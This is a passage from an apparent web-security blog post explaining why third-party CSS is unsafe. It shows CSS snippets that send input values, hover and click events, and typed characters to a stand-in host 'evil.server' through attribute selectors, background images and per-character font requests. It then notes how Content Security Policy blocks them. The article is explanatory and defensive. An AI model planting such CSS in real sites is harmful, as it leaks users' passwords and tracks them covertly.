<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">right</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">0</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">bottom</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">0</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"><span style="color: var(--shiki-token-function)">.c-rsvp</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-string-expression)">span</span><span style="color: var(--shiki-token-function)">:first-child</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">none</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">color</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">transparent</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">box-shadow</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">none</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div></section>
<section><h3><a href="#reading-attributes" id="reading-attributes">Reading attributes</a></h3>
<p>Using the attribute selector, a 3rd party CSS can style the element differently based on different attribute value.</p>
<p>One, for example, could load a different background image for different attribute value. By knowing which background image is loaded, one could then know the value of the attribute.</p>
<p>With enough CSS written, covering all possibile values of the attribute, one could possibly figure out or reduce the search space to figure out the attribute value.</p>
<p>To make matter worse, some framework, for example React, synchornizes <code class="inline">input.value</code> to the <code class="inline">&lt;input value=&quot;&quot;&gt;</code> attribute.</p>
<iframe src="https://codesandbox.io/embed/simple-password-ty7b7?fontsize=14&hidenavigation=1&theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="Simple password" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<p>An example of sniffing the attribute value using attribute selector + <code class="inline">background-image</code>:</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-string-expression)">input</span><span style="color: var(--shiki-color-text)">[</span><span style="color: var(--shiki-token-function)">value</span><span style="color: var(--shiki-token-keyword)">$=</span><span style="color: var(--shiki-token-string-expression)">&#39;a&#39;</span><span style="color: var(--shiki-color-text)">] &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-image</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/value?a&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"><span style="color: var(--shiki-token-string-expression)">input</span><span style="color: var(--shiki-color-text)">[</span><span style="color: var(--shiki-token-function)">value</span><span style="color: var(--shiki-token-keyword)">$=</span><span style="color: var(--shiki-token-string-expression)">&#39;b&#39;</span><span style="color: var(--shiki-color-text)">] &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-image</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/value?b&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"><span style="color: var(--shiki-token-string-expression)">input</span><span style="color: var(--shiki-color-text)">[</span><span style="color: var(--shiki-token-function)">value</span><span style="color: var(--shiki-token-keyword)">$=</span><span style="color: var(--shiki-token-string-expression)">&#39;c&#39;</span><span style="color: var(--shiki-color-text)">] &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-image</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/value?c&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"><span style="color: var(--shiki-token-string-expression)">input</span><span style="color: var(--shiki-color-text)">[</span><span style="color: var(--shiki-token-function)">value</span><span style="color: var(--shiki-token-keyword)">$=</span><span style="color: var(--shiki-token-string-expression)">&#39;d&#39;</span><span style="color: var(--shiki-color-text)">] &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-image</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/value?d&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div></section>
<section><h3><a href="#monitoring-attributes" id="monitoring-attributes">Monitoring attributes</a></h3>
<p>You can track hover and activations of an element and send that information to the server.</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-string-expression)">a</span><span style="color: var(--shiki-token-function)">.c-rsvp:hover</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-image</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/hover&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"><span style="color: var(--shiki-token-string-expression)">a</span><span style="color: var(--shiki-token-function)">.c-rsvp:active</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-image</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/click&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div></section>
<section><h3><a href="#reading-text" id="reading-text">Reading text</a></h3>
<p>If the secret important data on your website is not on the attribute, but rather being part of a text, you may think you are safe from 3rd party CSS, because there&#39;s no inner text selector in CSS.</p>
<p>However, there&#39;s still tricks up the 3rd party CSS sleeves: <strong>fonts</strong>.</p>
<p>A 3rd party CSS can declare a <code class="inline">font-family</code> that requires a different font file for different character, which means it could be use to determine what are the characters there is in the selected text.</p>
<p>However, there&#39;s a limitation to this, which is, there&#39;s no way telling the order and number of occurence of the characters. Because, the font files would be cached by the browser, and will not be fetched again with another occurence of the same character.</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-keyword)">@font-face</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">font-family</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">evil</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">src</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/key=A&#39;</span><span style="color: var(--shiki-token-constant)">) </span><span style="color: var(--shiki-token-function)">format</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;woff&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">unicode-range</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">U+41</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"></span>
<span class="line"><span style="color: var(--shiki-token-keyword)">@font-face</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">font-family</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">evil</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">src</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;http://evil.server/key=B&#39;</span><span style="color: var(--shiki-token-constant)">) </span><span style="color: var(--shiki-token-function)">format</span><span style="color: var(--shiki-token-constant)">(</span><span style="color: var(--shiki-token-string-expression)">&#39;woff&#39;</span><span style="color: var(--shiki-token-constant)">)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">unicode-range</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">U+42</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"></span>
<span class="line"><span style="color: var(--shiki-token-string-expression)">element</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">font-family</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">evil</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div>
<p>This could be apply to <code class="inline">&lt;input&gt;</code> as well. As the user types in their confidential information, character by character, the browser fetches the font file, and the <code class="inline">evil.server</code> will know which characters the user has typed into the input.</p></section>
<section><h2><a href="#content-security-policy" id="content-security-policy">Content Security Policy</a></h2>
<p>While I was trying to reading attributes from a local bank website, (to try out the feasibility of the techniques above), I couldn&#39;t load the background image from my <code class="inline">localhost</code> server.</p>
<p><span style="display: block; position: relative; padding-top: 7.500%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/csp-4ee76dc9.webp, https://lihautan.com/_app/assets/csp-612b10c9.webp 2x"><img src="https://lihautan.com/_app/assets/csp-8d17df33.png" srcset="https://lihautan.com/_app/assets/csp-8d17df33.png, https://lihautan.com/_app/assets/csp-5dc37b66.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="content security policy"></picture></span></p>
<p>It says my request to my image gets blocked by <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">Content Security Policy</a>.</p>
<p>So I checked the response of the webpage, and found out the following CSP header in the network tab.</p>
<p><span style="display: block; position: relative; padding-top: 50.931%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/csp-2-7b2844cc.webp, https://lihautan.com/_app/assets/csp-2-74acaf1c.webp 2x"><img src="https://lihautan.com/_app/assets/csp-2-7824dd5f.png" srcset="https://lihautan.com/_app/assets/csp-2-7824dd5f.png, https://lihautan.com/_app/assets/csp-2-0f0d8cba.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="content security policy"></picture></span></p>
<p>In the header, it specifies allow-list of domains / subdomains for specific type of asset. For example, in the following CSP</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="prism language-"><code><span class="line">img-src &#39;self&#39; *.gstatic.com;</span>
<span class="line">style-src &#39;self&#39;;</span></code></pre><!-- HTML_TAG_END --></div>
<p>it allows image source from the site&#39;s own origin and subdomain in <code class="inline">gstatic.com</code>, and only styles from the site&#39;s own origin.</p>
<p>Any styles or image source beyond the list will be blocked by the browser.</p></section>
<section><h2><a href="#summary" id="summary">Summary</a></h2>
<p>Third party CSS is not absolutely safe, where you can trust them blindly. It can modify, remove or add content to your site, which may indirectly reducing trust of your users to your site.</p></section>
<section><h2><a href="#further-reading" id="further-reading">Further reading</a></h2>
<ul><li><a href="https://jakearchibald.com/2018/third-party-css-is-not-safe/" rel="nofollow">https://jakearchibald.com/2018/third-party-css-is-not-safe/</a></li>
<li><a href="https://github.com/maxchehab/CSS-Keylogging" rel="nofollow">https://github.com/maxchehab/CSS-Keylogging</a></li>
<li><a href="https://vimeo.com/100264064#t=1290s" rel="nofollow">https://vimeo.com/100264064#t=1290s</a></li>
<li><a href="https://www.youtube.com/watch?v=eb3suf4REyI" rel="nofollow">https://www.youtube.com/watch?v=eb3suf4REyI</a></li>
<li><a href="https://www.nds.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf" rel="nofollow">https://www.nds.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf</a></li></ul></section></article>

<div style="height: 1px; width: 100%"></div>

</main>

<footer class="svelte-1x8iuzz">
</footer>


		<script type="module" data-hydrate="1w5jj9">
		import { start } from "https://lihautan.com/_app/start-c7a2dfb9.js";
		start({
			target: document.querySelector('[data-hydrate="1w5jj9"]').parentNode,
			paths: {"base":"","assets":"https://lihautan.com"},
			session: {},
			route: true,
			spa: false,
			trailing_slash: "always",
			hydrate: {
				status: 200,
				error: null,
				nodes: [
					import("https://lihautan.com/_app/pages/__layout.svelte-c3db4d7b.js"),
						import("https://lihautan.com/_app/pages/third-party-css-is-not-safe/index.md-5e516cbd.js")
				],
				params: {}
			}
		});
	</script></div>
	</body>
</html>
